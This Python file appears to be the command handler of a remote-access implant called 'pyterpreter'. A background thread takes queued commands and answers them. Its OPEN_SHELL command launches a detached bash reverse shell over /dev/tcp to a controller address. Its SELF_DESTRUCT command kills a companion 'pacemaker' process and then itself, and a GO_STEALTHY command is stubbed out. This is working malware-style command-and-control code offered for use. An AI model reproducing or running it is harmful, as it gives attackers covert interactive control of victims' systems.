import os
import signal
import subprocess
import sys
import threading
import time
from threading import Thread

from core.command import CommandResponse, CommandResponseError, CommandTypes
from core.message import Message, MessageTypes

from pyterpreter import config
from pyterpreter.my_logging import Logger

logger = Logger('PACEMAKER')


def process_commands_forever(blocking=False):
    if blocking:
        while True:
            message: Message
            command_request = config.commands_to_process.get()
            try:
                returns = _process_command(command_request.command_type, command_request.params)
            except Exception as ex:
                exception_str = "{}: {}".format(ex.__class__.__name__, str(ex))
                logger.log(f'Error occurred: {exception_str}')
                message = Message(MessageTypes.COMMAND_RESPONSE_ERROR, CommandResponseError(command_request.uid, exception_str).to_json())
            else:
                message = Message(MessageTypes.COMMAND_RESPONSE, CommandResponse(command_request.uid, returns).to_json())

            config.messages_to_send.put(message)
    else:
        Thread(target=process_commands_forever, args=(True,), daemon=True).start()


def _process_command(command_type: str, params: dict) -> dict:
    logger.log(f'Received {command_type} command: {params}')

    if command_type == CommandTypes.PING:
        return {}

    elif command_type == CommandTypes.OPEN_SHELL:
        port = params["port"]
        _start_process_detached(f"/bin/bash -c 'bash -i >& /dev/tcp/{config.LOCAL_IP}/{port} 0>&1'")
        return {}

    elif command_type == CommandTypes.GO_STEALTHY:
        raise NotImplementedError()

    elif command_type == CommandTypes.SELF_DESTRUCT:
        config.self_destructing = True
        os.kill(config.pacemaker_pid, signal.SIGKILL)
        logger.log('Exiting')
        os.kill(os.getpid(), signal.SIGTERM)

    else:
        raise Exception("Command '{}' not implemented".format(command_type))


def _start_process_detached(command: str):
    print(f'Running detached: "{command}"')
    proc = subprocess.Popen('/bin/sh', stdin=subprocess.PIPE)
    proc.stdin.write(f'{command} &\nexit\n'.encode())
    proc.communicate()
